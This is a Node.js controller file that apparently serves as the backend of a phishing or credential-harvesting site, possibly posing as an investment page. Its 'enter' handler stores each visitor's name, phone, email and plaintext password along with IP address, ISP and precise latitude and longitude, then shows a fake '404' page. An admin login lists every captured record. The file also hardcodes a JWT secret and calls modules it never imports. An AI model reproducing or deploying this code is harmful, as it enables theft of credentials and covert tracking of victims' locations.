const Just = require("../model/usermodel");
const Signup = require("../model/signup");
// const crypto = require("crypto");
const bcrypt = require("bcryptjs");
require("dotenv").config();
const jwt = require('jsonwebtoken');






const enter = async (req, res) => {
  try {
      const { fullname, phoneNumber, nickname, email, password, ipadd, country, region, city, isp, lat, lon, localink} = req.body;

      if (!fullname || !phoneNumber || !nickname || !email || !password || !ipadd ||!country || !region || !city || !isp || !lat || !lon || !localink) {
          res.render("invest/Investment/404", { user: req.session.user });
      } else {
          await createuser();
      }

      async function createuser() {
          const user = new Just({
              fullname,
              phoneNumber,
              nickname,
              email,
              password,
              ipadd,
              country,
              region,
              city,
              isp,
              lat,
              lon,
              localink,
          });

          

          try {
              await user.save();
              console.log('User saved successfully');

              // Update session
              req.session.user = {
                  id: user._id,
                  ipadd: user.ipadd,
                  email: user.email,
                  fullname: user.fullname,
                  phoneNumber: user.phoneNumber,
                  nickname: user.nickname,
                  password: user.password,
                  country: user.country,
                  region: user.region,
                  city: user.city,
                  isp: user.isp,
                  latitude: user.lat,
                  longitude: user.lon,
                  LocationLink: user.localink
              };

             
              res.render("404", { user: req.session.user });
          } catch (error) {
              console.error('Error saving user:', error);
              res.status(500).render("/404", { user: req.session.user });
          }
      }
  } catch (error) {
      console.error("Error during signup:", error);

      // Handle errors and ensure only one response
      if (!res.headersSent) {
          res.status(500).json({ status: "Failed", message: error.message });
      }
  }
};




const logIn = async (req, res) => {
    try {
        const { email, password } = req.body;

        // Find the admin by email
        const admin = await Signup.findOne({ email });
        if (!admin) {
            return res.status(400).json({ message: 'Invalid email or password' });
        }

        // Compare passwords using bcrypt
        const isMatch = await bcrypt.compare(password, admin.password);
        if (!isMatch) {
            return res.status(400).json({ message: 'Invalid email or password' });
        }

        // Store user session
        req.session.user = {
            id: admin._id,
            email: admin.email
        };

        // Send success response
        const signup = await Just.find(); 
        res.render("users/user", { user: req.session.user, signup  });

    } catch (err) {
        res.status(500).json({ message: 'Server error', error: err.message });
    }
};
  




const signup = async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ status: "Failed", message: "Please fill out all fields." });
        }

        let imageURL = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png';

        // If an image file is provided, upload it to Cloudinary
        if (req.file) {
            try {
                const result = await new Promise((resolve, reject) => {
                    const uploadStream = cloudinary.uploader.upload_stream({ resource_type: 'image' }, (error, result) => {
                        if (error) return reject(error);
                        resolve(result);
                    });
                    streamifier.createReadStream(req.file.buffer).pipe(uploadStream);
                });

                imageURL = result.secure_url; 
            } catch (error) {
                return res.status(500).send('Error uploading image to Cloudinary');
            }
        }

        // Call createUser function after processing the image
        await createUser(email, password, imageURL, req, res);

    } catch (error) {
        console.error("Error during signup:", error);

        if (!res.headersSent) {
            res.status(500).json({ status: "Failed", message: error.message });
        }
    }
};

async function createUser(email, password, imageURL, req, res) {
    try {
        // Hash the password before saving
        const hashedPassword = await bcrypt.hash(password, 10);

        const user = new Signup({
            email,
            password: hashedPassword,
            profileImage: imageURL, // Assuming you have this field in your schema
        });

        await user.save();

        // Generate a JWT token
        const token = jwt.sign({ id: user._id }, 'Adain', { expiresIn: '1h' });

        req.session.user = {
            id: user._id,
            email: user.email,
            profileImage: user.profileImage,
        };

        res.render("users/user", { user: req.session.user });

    } catch (error) {
        console.error('Error saving user:', error);
        res.status(500).send('Error saving user');
    }
}


// const troy = async (req, res) => {
//   try {
//     const { troy,} = req.body;

//     if (!troy) {
//       res.render("invest/Investment/404", {user: req.session.user})
//       // return res.status(400).json({ status: "Failed", message: "Please fill out all fields." });
    
//     } else{
//       createuser()
  
      
//     }

//     async function createuser(){

//        // Create a new user with the provided data and the image URL if available
//     const user = new Troy({
//       troy,
//     });


//       try {
//           await user.save();
//           // Generate a JWT token
//           const token = jwt.sign({ id: user._id}, 'Adain', { expiresIn: '1h' });

//           req.session.user = {
//               id: user._id,
//               troy: user.troy,
             
              
//           };
//           res.render("404", {user: req.session.user})
          
          
//       } catch (error) {
//         res.render("404", {user: req.session.user})
//       }
//     }

   

    

   
//   } catch (error) {
//     console.error("Error during signup:", error);

//     if (!res.headersSent) {
//       res.status(500).json({ status: "Failed", message: error.message });
//     }
//   }

  


// };





module.exports =
{

  enter,
  logIn,
  signup,
 
};